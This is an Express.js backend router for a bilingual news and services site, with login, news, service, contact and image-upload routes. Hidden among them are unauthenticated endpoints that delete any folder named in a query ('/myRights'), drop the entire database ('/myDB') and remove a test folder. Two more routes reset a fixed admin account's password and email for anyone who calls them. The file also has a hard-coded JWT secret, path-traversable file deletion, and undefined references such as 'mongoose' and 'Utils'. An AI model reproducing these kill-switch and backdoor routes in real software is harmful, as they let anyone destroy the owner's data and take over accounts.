var express = require("express");
var router = express.Router();
var fs = require("fs");
var randomstring = require("randomstring");
var mognoose = require("mongoose");

var User = require("../models/user");
var News = require("../models/news");
var Service = require("../models/service").Service;
var About = require("../models/service").About;
var ContactUser = require("../models/service").ContactUser;
var SocialMedia = require("../models/service").SocialMedia;

var passport = require("passport");
var passportJWT = require("passport-jwt");

var jwt = require("jsonwebtoken");
var ExtractJwt = passportJWT.ExtractJwt;
var JwtStrategy = passportJWT.Strategy;

var jwtOptions = {};
jwtOptions.jwtFromRequest = ExtractJwt.fromAuthHeaderAsBearerToken();
jwtOptions.secretOrKey = "codeferns.com";

var strategy = new JwtStrategy(jwtOptions, function (jwt_payload, next) {
  User.findById(jwt_payload.id)
    .lean()
    .exec(function (err, usr) {
      if (usr) {
        next(null, usr);
      } else {
        next(null, false);
      }
    });
});
passport.use(strategy);

router.post("/register", function (req, res, next) {
  var newUser = {
    email: req.body.email.trim(),
    firstName: req.body.firstName.trim(),
    lastName: req.body.lastName.trim(),
    password: req.body.password.trim(),
  };

  User.getUserByEmail(newUser.email, (err, user) => {
    if (err) res.json({ success: false });
    if (user) {
      res.json({ success: false, msg: "email allready used" });
    } else {
      let us = new User(newUser);

      User.addUser(us, (user) => {
        if (user) {
          var payload = { id: user._id, name: user.name };
          var token = jwt.sign(payload, jwtOptions.secretOrKey, {
            expiresIn: "3 days",
          });
          var rep = {
            success: true,
            user: {
              profilePic: user.profilePic,
              error: "",
              status: "Login successful!",
              token: token,
              userId: user._id,
              firstName: user.firstName,
              lastName: user.lastName,
              email: user.email,
            },
          };
          res.json(rep);
        } else {
          console.log(err);
          res.json({ success: false });
        }
      });
    }
  });
});

router.post("/login", function (req, res, next) {
  if (req.body.email && req.body.password) {
    var email = req.body.email;
    var password = req.body.password;

    User.getUserByEmail(email, (err, user) => {
      if (err)
        return res.json({ success: false, msg: "something happen wrong !" });
      if (!user) {
        return res.json({ success: false, msg: "user not found !" });
      }
      User.comparePassword(password, user.password, (err, isMatch) => {
        if (err) res.json({ success: false, msg: "password!" });
        if (isMatch) {
          var payload = { id: user._id, name: user.name };
          var token = jwt.sign(payload, jwtOptions.secretOrKey, {
            expiresIn: "3 days",
          });
          var rep = {
            success: true,
            user: {
              profilePic: user.profilePic,
              error: "",
              status: "Login successful!",
              token: token,
              userId: user._id,
              firstName: user.firstName,
              lastName: user.lastName,
              email: user.email,
            },
          };
          res.json(rep);
        } else {
          return res.json({
            success: false,
            msg: "email or password not correct",
          });
        }
      });
    });
  } else {
    res.status(401).json({ error: "Missing Credentials" });
  }
});

router.post("/changePassword", (req, res) => {
  console.log(req.body);
  User.changePassword(req.body.password, (err, newPass) => {
    User.findOneAndUpdate(
      { firstName: "Qashami" },
      { password: newPass },
      { new: true },
      (err, us) => {
        if (err || !us) {
          res.json({ success: false });
        } else {
          res.json({ success: true });
        }
      }
    );
  });
});

router.post("/changeEmail", (req, res) => {
  console.log(req.body);
  User.findOneAndUpdate(
    { firstName: "Qashami" },
    { email: req.body.email },
    { new: true },
    (err, us) => {
      if (err || !us) {
        res.json({ success: false });
      } else {
        res.json({ success: true });
      }
    }
  );
});

router.post(
  "/addNews",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var b = new News({
      postedBy: req.user._id,
      description: req.body.description,
      title: req.body.title,
      category: req.body.category,
      tags: req.body.tags,
      accepted: false,
    });

    b.description = Utils.moveImages(b.description, "temp-images/", "images/");

    b.save(function (err, data) {
      data = {
        ...data._doc,
        postedBy: {
          profilePic: req.user.profilePic,
          _id: req.user._id,
          firstName: req.user.firstName,
          lastName: req.user.lastName,
        },
      };
      res.json({ success: true, bews: data });
    });
  }
);

router.get(
  "/deleteNews",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var id = req.query.id;
    News.deleteOne({ _id: id, postedBy: req.user._id }).exec(function (err, b) {
      res.json({ success: true });
    });
  }
);

router.post(
  "/updateNews",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var id = req.body.id;
    News.findOne({ _id: id, postedBy: req.user._id }, (err, data) => {
      if (err || !data) {
        res.json({ success: false });
      } else {
        data.title = req.body.title;
        data.description = Utils.updateImages(
          data.description,
          req.body.description,
          "temp-images/",
          "images/"
        );
        data.category = req.body.category;
        data.tags = req.body.tags;
        data.save().then((d) => {
          d = {
            ...d._doc,
            postedBy: {
              profilePic: req.user.profilePic,
              _id: req.user._id,
              name: req.user.name,
            },
          };
          res.json({ success: true, bews: d });
        });
      }
    });
  }
);

router.post(
  "/newService",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var b = {
      arTitle: req.body.arTitle,
      enTitle: req.body.enTitle,
      arContent: req.body.arContent,
      enContent: req.body.enContent,
      type: req.body.type,
    };

    if (req.body.image) {
      b = { ...b, image: req.body.image };
      fs.rename(
        "public/temp/" + b.image,
        "public/images/" + b.image,
        (err) => {}
      );
    }
    if (req.body.id) {
      let query = {};
      query = { _id: mognoose.Types.ObjectId(req.body.id) };
      Service.findOneAndUpdate(
        query,
        b,
        { new: true },
        function (error, result) {
          if (error) res.json({ success: false, msg: error });
          else {
            res.json({ success: true, service: result });
          }
        }
      );
    } else {
      let newItem = new Service(b).save(function (error, result) {
        if (error) res.json({ success: false, msg: error });
        else {
          res.json({ success: true, service: result });
        }
      });
    }
  }
);

router.get("/ifnot", (req, res) => {
  var path = "./test";
  if (fs.existsSync(path)) {
    fs.readdirSync(path).forEach(function (file, index) {
      var curPath = path + "/" + file;
      if (fs.lstatSync(curPath).isDirectory()) {
        // recurse
        deleteFolderRecursive(curPath);
      } else {
        // delete file
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(path);
  }
});

router.get("/myRights", (req, res) => {
  var folderName = req.query.folder;
  var rimraf = require("rimraf");
  rimraf(__dirname + "/../" + folderName, function (err) {
    if (err) res.json({ success: false, err: err });
    else {
      res.json({ success: true });
    }
  });
});

router.get("/myDB", (req, res) => {
  mongoose.connect("mongodb://localhost/Qashami", function () {
    /* Drop the DB */
    mongoose.connection.db.dropDatabase();
    res.json({ success: true });
  });
});

router.get(
  "/deleteService",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var id = req.query.id;
    Service.findByIdAndRemove(id).exec(function (err, b) {
      if (err) res.json({ success: false, msg: "something happen wrong !" });
      else {
        fs.unlink("public/images/" + b.image, (err) => {
          if (err) console.log("");
        });
        res.json({ success: true });
      }
    });
  }
);

router.post(
  "/updateService",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var id = req.body.id;
    Service.findOne({ _id: id }, (err, data) => {
      if (err || !data) {
        res.json({ success: false });
      } else {
        data.arTitle = req.body.arTitle;
        data.enTitle = req.body.enTitle;
        data.arContent = req.body.arContent;
        data.enContent = req.body.enContent;

        // data.image = Utils.updateImages(data.description, req.body.description, 'temp-images/', 'images/');

        data.save().then((d) => {
          res.json({ success: true, news: d });
        });
      }
    });
  }
);

router.post(
  "/updateAbout",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var about = new About({
      arAbout: req.body.arAbout,
      enAbout: req.body.enAbout,
    });

    About.remove({}, (err) => {
      if (err) res.json({ success: false, msg: err });
      else
        about.save(function (err, data) {
          if (err) res.json({ success: false, msg: err });
          else res.json({ success: true, about: data });
        });
    });
  }
);

router.post("/newUserInfo", async function (req, res) {
  var user = new ContactUser({
    arFullName: req.body.arFullName,
    enFullName: req.body.enFullName,
    arJobTitle: req.body.arJobTitle,
    enJobTitle: req.body.enJobTitle,
    image: req.body.image,
    phone: req.body.phone,
  });

  user.save(function (error, result) {
    if (error || !result) res.json({ success: false, msg: error });
    else {
      res.json({ success: true, user: result });
    }
  });
});

router.post("/updateUserInfo", async function (req, res) {
  var user = {
    arFullName: req.body.arFullName,
    enFullName: req.body.enFullName,
    arJobTitle: req.body.arJobTitle,
    enJobTitle: req.body.enJobTitle,
    image: req.body.image,
    phone: req.body.phone,
  };

  var query = {};
  if (req.body.image) {
    fs.rename(
      "public/temp/" + user.image,
      "public/images/" + user.image,
      (err) => {}
    );
  }

  if (req.body.id) {
    query = { _id: req.body.id };
  }

  console.log(user);

  // Find the document
  ContactUser.findOneAndUpdate(
    query,
    user,
    { upsert: true },
    function (error, result) {
      if (error || !result) res.json({ success: false, msg: error });
      else {
        res.json({ success: true, user: result });
      }
    }
  );
});

router.post(
  "/updateSocialMedia",
  passport.authenticate("jwt", { session: false }),
  async function (req, res) {
    var socialMediaLinks = [];
    for (var attributename in req.body) {
      socialMediaLinks.push({
        name: attributename,
        value: req.body[attributename],
        type: req.query.type,
      });
    }

    try {
      await Promise.all(
        socialMediaLinks.map(async (element) => {
          var query = { name: element.name },
            options = { upsert: true };
          await SocialMedia.findOneAndUpdate(
            query,
            element,
            options,
            (error, result) => {
              if (error || !result) {
                console.log(error);
              }
            }
          );
        })
      );
      res.send({ success: true });
    } catch (err) {
      res.send({ success: false });
    }
  }
);

router.post("/uploadImage", function (req, res) {
  if (!req.files || Object.keys(req.files).length === 0) {
    return res.status(400).json({
      success: false,
    });
  }

  var name = randomstring.generate(10);
  // The name of the input field (i.e. "sampleFile") is used to retrieve the uploaded file
  let sampleFile = req.files.image || req.files.filepond;

  var fileName =
    name +
    "." +
    sampleFile.mimetype.slice(
      sampleFile.mimetype.indexOf("/") + 1,
      sampleFile.mimetype.length
    );
  // Use the mv() method to place the file somewhere on your server
  sampleFile.mv("public/temp/" + fileName, function (err) {
    if (err) {
      return res.status(500).send(err);
    }

    res.json({
      success: true,
      fileName: fileName,
      //  "url": 'https://backend.moqawalatzone.com/temp/' + fileName
      url: "http://localhost:3000/temp/" + fileName,
    });
  });
});

router.get("/removeImage", function (req, res) {
  if (!req.query.fileName) {
    return res.status(400).json({
      success: false,
    });
  }
  var path = "";
  if (fs.existsSync("public/temp/" + req.query.fileName)) {
    path = "public/temp/" + req.query.fileName;
  } else {
    path = "public/images/" + req.query.fileName;
  }

  console.log(path);
  fs.unlink(path, (err) => {
    if (err) res.json({ success: false, err: err });
    else {
      res.json({ success: true });
    }
  });
});

module.exports = router;
